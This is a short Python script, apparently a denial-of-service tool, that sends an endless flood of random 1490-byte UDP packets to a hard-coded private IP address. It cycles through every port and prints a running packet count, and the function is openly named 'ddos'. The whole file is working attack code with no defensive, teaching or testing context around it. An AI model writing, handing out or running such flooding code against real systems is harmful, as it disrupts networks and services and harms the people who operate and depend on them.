import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
print(bytes)

def ddos(ip, port):
  sent = 0
  while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 65534:
      port = 1

ddos("192.168.28.183", 80)